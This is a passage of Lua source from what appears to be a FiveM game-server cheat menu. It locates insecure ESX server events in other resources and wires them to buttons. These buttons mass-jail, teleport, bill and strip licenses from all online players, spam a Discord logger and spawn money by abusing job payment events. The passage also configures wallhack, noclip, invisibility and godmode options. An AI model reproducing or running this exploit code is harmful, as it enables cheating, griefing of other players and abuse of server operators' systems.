                    'ig_avery', 'ig_brucie2', 'ig_thornton', 'ig_tomcasino',
                    'ig_vincent'
                }
            }, {
                'Story Scenario Female', {
                    'u_f_m_corpse_01', 'u_f_m_miranda', 'u_f_m_miranda_02',
                    'u_f_m_promourn_01', 'u_f_o_moviestar', 'u_f_o_prolhost_01',
                    'u_f_y_bikerchic', 'u_f_y_comjane', 'u_f_y_corpse_01',
                    'u_f_y_corpse_02', 'u_f_y_danceburl_01',
                    'u_f_y_dancelthr_01', 'u_f_y_dancerave_01',
                    'u_f_y_hotposh_01', 'u_f_y_jewelass_01', 'u_f_y_mistress',
                    'u_f_y_poppymich', 'u_f_y_poppymich_02', 'u_f_y_princess',
                    'u_f_y_spyactress', 'u_f_m_casinocash_01',
                    'u_f_m_casinoshop_01', 'u_f_m_debbie_01', 'u_f_o_carol',
                    'u_f_o_eileen', 'u_f_y_beth', 'u_f_y_lauren', 'u_f_y_taylor'
                }
            }, {
                'Story Scenario Male', {
                    'u_m_m_aldinapoli', 'u_m_m_bankman', 'u_m_m_bikehire_01',
                    'u_m_m_doa_01', 'u_m_m_edtoh', 'u_m_m_fibarchitect',
                    'u_m_m_filmdirector', 'u_m_m_glenstank_01',
                    'u_m_m_griff_01', 'u_m_m_jesus_01', 'u_m_m_jewelsec_01',
                    'u_m_m_jewelthief', 'u_m_m_markfost', 'u_m_m_partytarget',
                    'u_m_m_prolsec_01', 'u_m_m_promourn_01', 'u_m_m_rivalpap',
                    'u_m_m_spyactor', 'u_m_m_streetart_01', 'u_m_m_willyfist',
                    'u_m_o_filmnoir', 'u_m_o_finguru_01', 'u_m_o_taphillbilly',
                    'u_m_o_tramp_01', 'u_m_y_abner', 'u_m_y_antonb',
                    'u_m_y_babyd', 'u_m_y_baygor', 'u_m_y_burgerdrug_01',
                    'u_m_y_chip', 'u_m_y_corpse_01', 'u_m_y_cyclist_01',
                    'u_m_y_danceburl_01', 'u_m_y_dancelthr_01',
                    'u_m_y_dancerave_01', 'u_m_y_fibmugger_01',
                    'u_m_y_guido_01', 'u_m_y_gunvend_01', 'u_m_y_hippie_01',
                    'u_m_y_imporage', 'u_m_y_juggernaut_01', 'u_m_y_justin',
                    'u_m_y_mani', 'u_m_y_militarybum', 'u_m_y_paparazzi',
                    'u_m_y_party_01', 'u_m_y_pogo_01', 'u_m_y_prisoner_01',
                    'u_m_y_proldriver_01', 'u_m_y_rsranger_01', 'u_m_y_sbike',
                    'u_m_y_smugmech_01', 'u_m_y_staggrm_01', 'u_m_y_tattoo_01',
                    'u_m_y_zombie_01', 'u_m_m_blane', 'u_m_m_curtis',
                    'u_m_m_vince', 'u_m_o_dean', 'u_m_y_caleb',
                    'u_m_y_croupthief_01', 'u_m_y_gabriel', 'u_m_y_ushi'
                }
            }
        },
        Props = {
            {
                'Bust', 'Tyre', 'Crystal', 'Crystal 2', 'Crystal 3', 'Vent',
                'Distribuitor', 'House 1', 'Broken Stand', 'Tank', 'Tree'
            }, {
                'v_corp_bk_bust', 'v_ind_cm_tyre08', 'v_res_fa_crystal01',
                'v_res_fa_crystal02', 'v_res_fa_crystal03',
                'prop_ventsystem_03', 'v_ret_247shelves02',
                'des_apartmentblock_skin', 'des_scaffolding_root',
                'des_scaffolding_tank_root', 'des_protree_root'
            }
        },
        Kits = {
            {
                '100k Basic', '100k Basic with Divo', 'Police Basic',
                'Police Advanced', 'Rage'
            }, {
                {{'weapon', 'WEAPON_APPISTOL'}, {'armour', 100}},
                {
                    {'weapon', 'WEAPON_APPISTOL'}, {'armour', 100},
                    {'vehicle', 'divo'}
                }, {
                    {'weapon', 'WEAPON_PISTOL', 250},
                    {'weapon', 'WEAPON_STUNGUN', 1}, {'armour', 100}
                }, {
                    {'weapon', 'WEAPON_PISTOL', 220},
                    {'weapon', 'WEAPON_STUNGUN', 1},
                    {'weapon', 'WEAPON_PUMPSHOTGUN', 220},
                    {'weapon', 'WEAPON_CARBINERIFLE', 220}, {'armour', 100}
                }, {
                    {'weapon', 'WEAPON_MARKSMANRIFLE'},
                    {'weapon', 'WEAPON_ASSAULTRIFLE'},
                    {'weapon', 'WEAPON_APPISTOL'}, {'armour', 100}
                }
            }
        },
        ShootVehicles = 0x39DA2754,
        RainVehicles = {Times = 1, Delay = 250, Model = 0xB779A091},
        BaldiesAttack = {Times = 1, Delay = 250, Weapon = 'weapon_unarmed'},
        PlayersBrowserSelected = {}
    }
    c.var.data.Triggers = {
        {
            store = 'esx_vehicleshop:setVehicleOwned',
            resources = {'vehicleshop', 'tiendacoches', 'concesiona'},
            files = {'client/main.lua', 'main.lua'},
            patterns = 'under$if Config.EnableOwnedVehicles then'
        }, {
            store = 'esx_vehicleshop:setVehicleOwnedPlayerId',
            resources = {'vehicleshop', 'tiendacoches', 'concesiona'},
            files = {'client/main.lua', 'main.lua'},
            patterns = 'above$currentDisplayVehicle = nil'
        }, {
            store = 'dp-emotes:ServerValidEmote',
            resources = {
                'dpemotes', 'emotes', 'animaciones', 'dp-emotes', 'animaciones'
            },
            files = {'client/Syncing.lua', 'Client/Syncing.lua'},
            patterns = 'under$if otheremote == nil then otheremote = requestedemote end',
            addto = {
                ['OnlinePlayersOptions'] = {
                    data = {
                        title = 'Emote Player',
                        value = 'onlineplayers:emote',
                        labels = c.var.data.EmotesList.labels,
                        results = c.var.data.EmotesList.data
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_EmotePlayers({c.var.data.selectedPlayer.lid},
                                              c0.result)
                    end
                },
                ['Destroyer'] = {
                    data = {
                        title = 'Emote Players',
                        value = 'allplayers:emote',
                        labels = c.var.data.EmotesList.labels,
                        results = c.var.data.EmotesList.data
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_EmotePlayers(b.GetActivePlayers(), c0.result)
                    end
                }
            }
        }, {
            store = 'esx-qalle-jail:JailPlayer',
            resources = {'jail', 'esx_jail', 'carcel', 'esx-qalle-jail'},
            files = {'client/client.lua', 'client/main.lua'},
            patterns = 'above$end, function%(data3, menu3%)',
            addto = {
                ['OnlinePlayersOptions'] = {
                    data = {title = 'Jail Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_JailPlayers({c.var.data.selectedPlayer.lid})
                    end
                },
                ['Destroyer'] = {
                    data = {title = 'Jail Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_JailPlayers(b.GetActivePlayers())
                    end
                }
            }
        }, {
            store = 'esx_status:set',
            resources = 'status',
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$Citizen.Wait%(Config.TickTime%)',
            func = 'RegisterNetEvent',
            addto = {
                ['Recovery'] = {
                    data = {
                        title = 'Status',
                        value = 'recovery:status',
                        labels = {'Thirst', 'Hunger', 'Stress'},
                        results = {'thirst', 'hunger', 'stress'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c.var.tr['esx_status:set'] then
                            c.func.TriggerCustomEvent(false,
                                                      c.var.tr['esx_status:set'],
                                                      c0.result,
                                                      c0.index == 3 and 10 or
                                                          1000000)
                        end
                    end
                }
            }
        }, {
            store = 'esx_dmvschool:addLicense',
            resources = {'dmvschool', 'dmv_school', 'dmv'},
            files = {'client/main.lua', 'client/client.lua', 'client.lua'},
            patterns = 'under$function StopDriveTest%(success%)',
            addto = {
                ['Recovery'] = {
                    data = {
                        title = 'Add license',
                        value = 'recovery:addlicense',
                        labels = {'Theorical', 'Car', 'Bike', 'Truck', 'Weapon'},
                        results = {
                            'dmv', 'drive', 'drive_bike', 'drive_truck',
                            'weapon'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c.var.tr['esx_dmvschool:addLicense'] then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_dmvschool:addLicense'],
                                                      c0.result)
                        end
                    end
                }
            }
        }, {
            store = 'esx_policejob:message',
            resources = 'policejob',
            files = {
                'client/main.lua', 'client/job.lua', 'job.lua', 'client.lua'
            },
            patterns = 'under$ESX%.UI%.Menu%.Open%(\'default\', GetCurrentResourceName%(%), \'manage_license\', {',
            addto = {
                ['OnlinePlayersOptions'] = {
                    data = {title = 'Message Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_MessagePlayers({c.var.data.selectedPlayer.lid})
                    end
                },
                ['Destroyer'] = {
                    data = {title = 'Message Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_MessagePlayers(b.GetActivePlayers())
                    end
                }
            }
        }, {
            store = 'esx_billing:sendBill',
            resources = 'policejob',
            files = {
                'client/main.lua', 'client/job.lua', 'job.lua', 'client.lua'
            },
            patterns = 'under$ESX%.UI%.Menu%.Open%(\'default\', GetCurrentResourceName%(%), \'fine_category\', {',
            addto = {
                ['OnlinePlayersOptions'] = {
                    data = {title = 'Bill Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_BillPlayers({c.var.data.selectedPlayer.lid})
                    end
                },
                ['Destroyer'] = {
                    data = {title = 'Bill Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_BillPlayers(b.GetActivePlayers())
                    end
                }
            }
        }, {
            store = 'DiscordBot:PlayerDied',
            resources = {'discordbot', 'discord', 'discordlogs'},
            files = {
                'CLIENT/MAIN.lua', 'CLIENT/main.lua', 'CLIENT/CLIENT.lua',
                'CLIENT/client.lua'
            },
            patterns = 'under$if DeathReason ==',
            addto = {
                ['Destroyer'] = {
                    data = {title = 'Spam Discord'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['DiscordBot:PlayerDied'] then
                            return
                        end
                        local eO = c.func.KeyboardInput('Enter the message',
                                                        'Absolute on Top', 3,
                                                        false)
                        local i9 = c.func.KeyboardInput(
                                       'Enter amount of messages', '10', 3, true)
                        if not eO or not time or time < 1 then
                            return
                        end
                        a.CreateThread(function()
                            for ev = 1, i9, 1 do
                                a.Wait(58)
                                c.func.TriggerCustomEvent(true,
                                                          c.var.tr['DiscordBot:PlayerDied'],
                                                          eO, 'Abso on Top')
                            end
                        end)
                    end
                }
            }
        }, {
            store = 'esx_hifi:play_music',
            resources = {'esx_hifi', 'hifi'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$title = _U%(\'play\'%),',
            addto = {
                ['Destroyer'] = {
                    data = {title = 'Play music'},
                    func = 'Button',
                    result = function()
                        local f3 = c.func.KeyboardInput('Video id',
                                                        'dQw4w9WgXcQ&ab', 40,
                                                        false)
                        a.CreateThread(function()
                            for k, eB in c._ipairs(b.GetActivePlayers()) do
                                a.Wait(c._math.random(35, 50))
                                local c8 = b.GetEntityCoords(b.GetPlayerPed(eB))
                                c.func.TriggerCustomEvent(true,
                                                          c.var.tr['esx_hifi:play_music'],
                                                          f3, c8)
                            end
                        end)
                    end
                }
            }
        }, {
            store = 'esx_policejob:requesthandcuff',
            resources = {
                'unijob', 'esx_policejob', 'policejob', 'cnpjob', 'rangerjob'
            },
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$== \'handcuff\' then',
            payload = 'target_id, playerheading, playerCoords, playerlocation',
            addto = {
                ['Destroyer'] = {
                    data = {
                        title = 'Tp all',
                        value = 'allplayers:tpall',
                        labels = {'To Mazebank', 'To Waypoint'},
                        results = {
                            c._vector3(-75.015, -818.215, 327.0),
                            c._vector3(1, 1, 1)
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        a.CreateThread(function()
                            local c8 = c0.result;
                            if c0.label == 'To Waypoint' then
                                local gE = b.GetFirstBlipInfoId(8)
                                if b.DoesBlipExist(gE) then
                                    c8 = b.GetBlipInfoIdCoord(gE)
                                else
                                    c.fram.func.Notify('error',
                                                       'No waypoint has been setted')
                                    return
                                end
                            end
                            for k, eB in c._ipairs(b.GetActivePlayers()) do
                                a.Wait(c._math.random(35, 50))
                                c.func.TriggerCustomEvent(true,
                                                          c.var.tr['esx_policejob:requesthandcuff'],
                                                          b.GetPlayerServerId(eB),
                                                          100.0, c8, 5.0)
                            end
                        end)
                    end
                }
            }
        }, {
            store = 'esx_license:removeLicense',
            resources = 'policejob',
            files = {
                'client/main.lua', 'client/job.lua', 'job.lua', 'client.lua'
            },
            patterns = 'above$function OpenUnpaidBillsMenu%(player%)',
            addto = {
                ['Destroyer'] = {
                    data = {title = 'Remove all player licenses'},
                    func = 'Button',
                    result = function()
                        local ia = {
                            'dmv', 'drive', 'drive_bike', 'drive_truck',
                            'weapon'
                        }
                        a.CreateThread(function()
                            for k, eB in c._ipairs(b.GetActivePlayers()) do
                                a.Wait(3)
                                for hk, hl in c._ipairs(ia) do
                                    a.Wait(c._math.random(35, 50))
                                    c.func.TriggerCustomEvent(true,
                                                              c.var.tr['esx_license:removeLicense'],
                                                              b.GetPlayerServerId(
                                                                  eB), hl)
                                end
                            end
                        end)
                    end
                }
            }
        }, {
            store = 'kc_admin:jail',
            resources = {'kc_admin', '_admin'},
            files = {'client/client.lua', 'client.lua'},
            patterns = 'under$RegisterNUICallback%(\"jail\", function %(data%)',
            addto = {
                ['Destroyer'] = {
                    data = {title = 'Jail Players'},
                    func = 'Button',
                    result = function()
                        a.CreateThread(function()
                            local time =
                                c.func.KeyboardInput('Time (-1 for random)', '',
                                                     7, true)
                            for k, eB in c._ipairs(b.GetActivePlayers()) do
                                a.Wait(c._math.random(35, 70))
                                c.func.TriggerCustomEvent(true,
                                                          c.var.tr['kc_admin:jail'],
                                                          b.GetPlayerServerId(eB),
                                                          time == -1 and
                                                              c._math
                                                                  .random(100,
                                                                          1000000) or
                                                              time)
                            end
                        end)
                    end
                }
            }
        }, {
            store = 'esx_drugs:harvestCoke',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'coke_harvest\' then'
        }, {
            store = 'esx_drugs:treatCoke',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'coke_treatment\' then'
        }, {
            store = 'esx_drugs:sellCoke',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'coke_resell\' then'
        }, {
            store = 'esx_drugs:harvestMeth',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'meth_harvest\' then'
        }, {
            store = 'esx_drugs:treatMeth',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'meth_treatment\' then'
        }, {
            store = 'esx_drugs:sellMeth',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'meth_resell\' then'
        }, {
            store = 'esx_drugs:harvestWeed',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'weed_harvest\' then'
        }, {
            store = 'esx_drugs:treatWeed',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'weed_treatment\' then'
        }, {
            store = 'esx_drugs:sellWeed',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'weed_resell\' then'
        }, {
            store = 'esx_drugs:harvestOpium',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'opium_harvest\' then'
        }, {
            store = 'esx_drugs:treatOpium',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'opium_treatment\' then'
        }, {
            store = 'esx_drugs:sellOpium',
            resources = {'esx_drugs', 'drugs', 'drogas'},
            files = {
                'client/client.lua', 'client/esx_drugs_cl.lua',
                'client/main.lua'
            },
            patterns = 'under$if CurrentAction == \'opium_treatment\' then'
        }, {
            store = 'esx_vangelico_robbery:gioielli',
            resources = {'vangelico_robbery', 'vangelico'},
            files = {
                'client/esx_vangelico_robbery_cl.lua', 'client/client.lua',
                'client/main.lua'
            },
            patterns = 'above$if vetrineRotte == Config.MaxWindows then'
        }, {
            store = 'lester:vendita',
            resources = {'vangelico_robbery', 'vangelico'},
            files = {
                'client/esx_vangelico_robbery_cl.lua', 'client/client.lua',
                'client/main.lua'
            },
            patterns = 'under$FreezeEntityPosition%(playerPed, false%)'
        }, {
            store = 'gacha_compraVenta:sellVehicle',
            resources = {'compraventa', 'origen_compra'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'above$function ListVehiclesMenu%(%)',
            addto = {
                ['Recovery'] = {
                    data = {title = '#1 Money spawn'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['gacha_compraVenta:sellVehicle'] then
                            return
                        end
                        local ib = c.func.KeyboardInput('Money amount', '1000',
                                                        3, true)
                        if ib > 1 then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['gacha_compraVenta:sellVehicle'],
                                                      'AKD DJF', ib)
                        end
                    end
                }
            }
        }, {
            store = 'esx_illegal:Wash',
            resources = {'esx_ilegal', 'ilegal'},
            files = {'client/moneywash.lua', 'client/money_wash.lua'},
            patterns = 'under$if data%.current%.value == \'moneywash_wash\' then',
            addto = {
                ['Recovery'] = {
                    data = {title = '#2 Wash money'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['esx_illegal:Wash'] then
                            return
                        end
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['esx_illegal:Wash'])
                    end
                }
            }
        }, {
            store = 'esx_truckerjob:pay',
            resources = {'truckerjob', 'camionerojob'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$if IsVehicleAttachedToTrailer%(truck%) and %(GetVehiclePedIsIn%(GetPlayerPed%(-1%), false%) == truck%) then',
            addto = {
                ['Recovery'] = {
                    data = {title = '#3 Truckerjob'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['esx_truckerjob:pay'] then
                            return
                        end
                        local ib = c.func.KeyboardInput('Money amount', '1000',
                                                        3, true)
                        if ib > 1 then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_truckerjob:pay'],
                                                      ib)
                        end
                    end
                }
            }
        }, {
            store = 'esx_garbage:pay',
            resources = {'esx_garbage', 'esx_basurero'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$AddEventHandler%(\'esx_garbage:startpayrequest\', function%(platenumber, amount%)',
            addto = {
                ['Recovery'] = {
                    data = {title = '#3 Garbage pay'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['esx_garbage:pay'] then
                            return
                        end
                        local ib = c.func.KeyboardInput('Money amount', '1000',
                                                        3, true)
                        if ib > 1 then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_garbage:pay'],
                                                      ib)
                        end
                    end
                }
            }
        }, {
            store = 'esx_yacht:reward',
            resources = {'esx_yacht', 'yacht', 'barcorobo'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$if searched == 20 then',
            addto = {
                ['Recovery'] = {
                    data = {title = '#4 Yatch exploit'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['esx_yacht:reward'] then
                            return
                        end
                        local ic = c.func.KeyboardInput('Tries amount', '50', 3,
                                                        true)
                        if ic > 1 then
                            a.CreateThread(function()
                                for ev = 1, ic, 1 do
                                    c.func.TriggerCustomEvent(true,
                                                              c.var.tr['esx_yacht:reward'])
                                    a.Wait(34)
                                end
                            end)
                        end
                    end
                }
            }
        }, {
            store = 'gopostal_job:caution',
            resources = {'gopostal', 'postaljob', 'correo'},
            files = {'client/main.lua', 'client/client.lua'},
            patterns = 'under$local giveBack = ESX.Math.Round%(vehicleHealth / vehicleMaxHealth, 2%)',
            addto = {
                ['Recovery'] = {
                    data = {title = '#5 Go Postal'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['gopostal_job:caution'] then
                            return
                        end
                        local ib = c.func.KeyboardInput('Money amount', '1000',
                                                        3, true)
                        if ib > 1 then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['gopostal_job:caution'],
                                                      ib)
                        end
                    end
                }
            }
        }, {
            store = 'portjob:getMoney',
            resources = {'portjob', 'aduanajob'},
            files = {'client/main.lua', 'client/client.lua', 'client.lua'},
            patterns = 'under$salairetable[1] ~= nil',
            addto = {
                ['Recovery'] = {
                    data = {title = '#6 PJob'},
                    func = 'Button',
                    result = function()
                        if not c.var.tr['portjob:getMoney'] then
                            return
                        end
                        local ib = c.func.KeyboardInput('Money amount', '1000',
                                                        3, true)
                        if ib > 1 then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['portjob:getMoney'],
                                                      {ib})
                        end
                    end
                }
            }
        }, {
            store = 'fishing:catch',
            resources = {'advancedfishing', 'fishing', 'pesca'},
            files = {'client/main.lua', 'client/client.lua', 'client.lua'},
            patterns = 'under$if input == correct then',
            addto = {
                ['Recovery'] = {
                    data = {
                        title = 'Get Fish',
                        value = 'recovery:catchfish',
                        labels = {'fish', 'shark', 'turtle'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        local id = c.func.KeyboardInput('Enter amount of tries',
                                                        '', 3, true)
                        a.CreateThread(function()
                            for ev = 1, id, 1 do
                                a.Wait(c._math.random(35, 400))
                                c.func.TriggerCustomEvent(true,
                                                          c.var.tr['fishing:catch'],
                                                          c0.label)
                            end
                            c.fram.func.Notify('info',
                                               'Finished looping fishes (' .. id ..
                                                   ')(' .. c0.label .. ')')
                        end)
                    end
                }
            }
        }, {
            store = 'fishing:startSelling',
            resources = {'advancedfishing', 'fishing', 'pesca'},
            files = {'client/main.lua', 'client/client.lua', 'client.lua'},
            patterns = 'above$Citizen.Wait%(4000%)',
            addto = {
                ['Recovery'] = {
                    data = {
                        title = 'Sell Fish',
                        value = 'recovery:sellfish',
                        labels = {'fish', 'shark', 'turtle'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['fishing:startSelling'],
                                                  c0.label)
                    end
                }
            }
        }
    }
    c.var.colors = {
        ['menu:header'] = {255, 255, 255, 255},
        ['menu:subTitlebackground'] = {12, 5, 47, 255},
        ['menu:bottomsubTitlebackground'] = {12, 5, 47, 255},
        ['menu:subTitleText'] = {255, 255, 255, 255},
        ['menu:bottomsubTitlesprite'] = {255, 255, 255, 255},
        ['menu:noSelectedText'] = {255, 255, 255, 255},
        ['menu:noSelectedFeaturebackground'] = {10, 10, 10, 255},
        ['menu:noselectedmenuButtonSprite'] = {255, 255, 255, 255},
        ['menu:selectedmenuButtonSprite'] = {0, 0, 0, 255},
        ['menu:checkbox'] = {255, 255, 255, 255},
        ['menu:selectedCheckbox'] = {0, 0, 0, 255},
        ['menu:separatorBrackets'] = {92, 43, 233, 255},
        ['menu:selectedText'] = {10, 10, 10, 255},
        ['menu:selectedFeaturebackground'] = {92, 43, 233, 255},
        ['visuals_wallhack:box'] = {0, 0, 102, 100},
        ['visuals_wallhack:frame'] = {51, 51, 255, 255},
        ['visuals_lines:lines'] = {255, 255, 255, 255},
        ['visuals_lines:dimensions'] = {255, 255, 255, 255},
        ['visuals_tracers:impacts'] = {255, 255, 255, 255},
        ['visuals_tracers:trajectory'] = {255, 255, 255, 255},
        ['visuals_names:normal'] = {255, 255, 255, 255},
        ['visuals_names:dead'] = {255, 255, 255, 255},
        ['visuals_worldilumination:color'] = {255, 255, 255},
        ['visuals_skeleton:bones'] = {255, 255, 255, 255},
        ['bagsesp:lines'] = {255, 255, 255, 255},
        ['bagsesp:frame'] = {51, 255, 51, 255},
        ['bagsesp:box'] = {25, 51, 0, 100}
    }
    c.fram.menus = {
        ['MainMenu'] = {
            parent = 'MainMenu',
            subTitle = 'Main Menu',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Self Menu',
                        subMenu = 'Self',
                        description = 'self submenu'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Online Players',
                        subMenu = 'OnlinePlayers',
                        description = 'Online Players related options'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Vehicle',
                        subMenu = 'Vehicle',
                        description = 'Vehicle related options'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Weapon',
                        subMenu = 'Weapon',
                        description = 'Weapon related options'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Visual',
                        subMenu = 'Visuals',
                        description = 'Visuals dah\''
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Teleport',
                        subMenu = 'Teleports',
                        description = 'Visuals dah\''
                    },
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Synchronized between players'},
                    func = 'Separator'
                }, {
                    data = {
                        title = 'Destroyer',
                        subMenu = 'Destroyer',
                        description = 'Nuke this shit out'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Miscellaneous',
                        subMenu = 'Misc',
                        description = 'self submenu'
                    },
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Recovery', subMenu = 'Recovery'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Settings', subMenu = 'Settings'},
                    func = 'MenuButton'
                }
            }
        },
        ['Self'] = {
            parent = 'MainMenu',
            subTitle = 'Self Options',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Animations list',
                        subMenu = 'Self_Animations',
                        description = 'Play animations'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Wardobe Maker',
                        subMenu = 'Self_WardobeMaker',
                        description = 'Wardobe Maker menu'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Inhuman Habilities',
                        subMenu = 'Self_SuperPowers',
                        description = 'OwO'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Stats Editor',
                        subMenu = 'Self_StatsEditor',
                        description = 'Stats Changer'
                    },
                    func = 'MenuButton'
                }, {
                    data = {title = 'Ped Changer', subMenu = 'Self_PedChanger'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Revive'},
                    func = 'Button',
                    result = c.func.B_Revive
                },
                {
                    data = {title = 'Suicide'},
                    func = 'Button',
                    result = c.func.B_Suicide
                }, {
                    data = {title = 'Refill health'},
                    func = 'Button',
                    result = c.func.B_RefillHealth
                }, {
                    data = {title = 'Refill Armour'},
                    func = 'Button',
                    result = c.func.B_RefillArmour
                }, {data = {title = 'Multipliers'}, func = 'Separator'}, {
                    data = {
                        title = 'Health',
                        value = 'self:healthmultipler',
                        labels = {
                            '10%', '20%', '30%', '40%', '50%', '60%', '70%',
                            '80%', '90%', '100%'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        b.SetEntityHealth(b.PlayerPedId(), 100 + c0.index * 10)
                    end
                }, {
                    data = {
                        title = 'Armour',
                        value = 'self:armourmultipler',
                        labels = {
                            '0%', '10%', '20%', '30%', '40%', '50%', '60%',
                            '70%', '80%', '90%', '100%'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        b.SetPedArmour(b.PlayerPedId(),
                                       c0.label == '0%' and 0 or c0.index * 10)
                    end
                }, {
                    data = {
                        title = 'Alpha (Local)',
                        value = 'self:alphamultiplier',
                        labels = {'0%', '20%', '40%', '60%', '80%', '100%'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        b.SetEntityAlpha(b.PlayerPedId(),
                                         c0.label == '0%' and 0 or 51 *
                                             (c0.index - 1), false)
                    end
                }, {data = {title = 'Modifiers'}, func = 'Separator'}, {
                    data = {title = 'Super Jump', value = 'SuperJump'},
                    func = 'CheckBox',
                    result = c.func.C_SuperJump
                }, {
                    data = {
                        title = 'Infinite Roll',
                        value = 'InfiniteCombatRoll'
                    },
                    func = 'CheckBox',
                    result = c.func.C_InfiniteCombatRoll
                }, {
                    data = {title = 'No Criticals', value = 'NoCriticals'},
                    func = 'CheckBox',
                    result = c.func.C_NoCriticals
                }, {
                    data = {title = 'Move On Water', value = 'MoveOnWater'},
                    func = 'CheckBox',
                    result = c.func.C_MoveOnWater
                }, {
                    data = {title = 'Disable Ragdoll', value = 'NoRagdoll'},
                    func = 'CheckBox',
                    result = c.func.C_NoRagdoll
                }, {
                    data = {title = 'Noclip', value = 'NoClip'},
                    func = 'CheckBox',
                    result = c.func.C_NoClip
                }, {
                    data = {
                        title = 'Infinite Stamina',
                        value = 'InfiniteStamina'
                    },
                    func = 'CheckBox',
                    result = c.func.C_InfiniteStamina
                }, {
                    data = {title = 'Invisible', value = 'Invisible'},
                    func = 'CheckBox',
                    result = c.func.C_Invisible
                }, {
                    data = {
                        title = 'Running',
                        value = 'self:walkingmultiplier',
                        labels = {
                            'DFT', '+20%', '+40%', '+60%', '+80%', '+100%'
                        },
                        results = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        b.SetRunSprintMultiplierForPlayer(b.PlayerId(),
                                                          c0.result)
                    end
                }, {
                    data = {
                        title = 'Swimming',
                        value = 'self:swimmingmultiplier',
                        labels = {
                            'DFT', '+20%', '+40%', '+60%', '+80%', '+100%'
                        },
                        results = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
                    },
                    func = 'ComboBox',
